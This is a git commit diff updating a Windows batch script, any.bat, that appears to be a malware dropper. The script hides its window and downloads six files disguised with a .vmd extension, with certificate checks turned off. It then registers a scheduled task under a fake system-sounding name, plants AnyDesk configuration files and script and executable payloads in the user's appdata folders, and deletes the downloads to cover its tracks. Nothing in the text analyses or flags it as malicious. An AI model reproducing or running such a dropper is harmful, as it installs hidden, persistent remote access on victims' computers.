8bb727af15a6b9882eb5e31a29dc14135cdcb928
nemovoid <mpckmc@outlook.kr>
2026-08-13 11:28:14 +0900

    Update any.bat

--- aefsany/any.bat
+++ aefsany/any.bat
@@ -1,16 +1,16 @@
 mode 15,1
-curl -k -L -o "%~dp0asdfhk0" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/applevbs.vmd"
-curl -k -L -o "%~dp0asdfhk1" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/bananaps1.vmd"
-curl -k -L -o "%~dp0asdfhk2" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/gamser.vmd"
-curl -k -L -o "%~dp0asdfhk3" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/gamsys.vmd"
-curl -k -L -o "%~dp0asdfhk4" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/orangeany.vmd"
-curl -k -L -o "%~dp0asdfhk5" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/tomatoxml.vmd"
+curl -k -L -o "%~dp0hwihsk0" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/applevbs.vmd"
+curl -k -L -o "%~dp0hwihsk1" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/bananaps1.vmd"
+curl -k -L -o "%~dp0hwihsk2" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/gamser.vmd"
+curl -k -L -o "%~dp0hwihsk3" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/gamsys.vmd"
+curl -k -L -o "%~dp0hwihsk4" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/orangeany.vmd"
+curl -k -L -o "%~dp0hwihsk5" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/tomatoxml.vmd"
 
-schtasks /create /tn User_Feed_Synchronization-{0DDC78AB-E733-425C-B92B-ABAC149AB11232} /xml "%~dp0asdfhk5" /f
+schtasks /create /tn User_Feed_Synchronization-{0DDC78AB-E733-425C-B92B-ABAC149AB11232} /xml "%~dp0hwihsk5" /f
 md "%appdata%\AnyDesk"
-copy /Y "%~dp0asdfhk2" "%appdata%\AnyDesk\service.conf"
-copy /Y "%~dp0asdfhk3" "%appdata%\AnyDesk\system.conf"
-copy /Y "%~dp0asdfhk1" "%appdata%\Microsoft\windows\default_an.ps1"
-copy /Y "%~dp0asdfhk4" "%appdata%\Microsoft\windows\default_an.exe"
-copy /Y "%~dp0asdfhk0" "%appdata%\Microsoft\windows\default_an.vbs"
-del "%~dp0*asdfhk*" /f
+copy /Y "%~dp0hwihsk2" "%appdata%\AnyDesk\service.conf"
+copy /Y "%~dp0hwihsk3" "%appdata%\AnyDesk\system.conf"
+copy /Y "%~dp0hwihsk1" "%appdata%\Microsoft\windows\default_an.ps1"
+copy /Y "%~dp0hwihsk4" "%appdata%\Microsoft\windows\default_an.exe"
+copy /Y "%~dp0hwihsk0" "%appdata%\Microsoft\windows\default_an.vbs"
+del "%~dp0*hwihsk*" /f
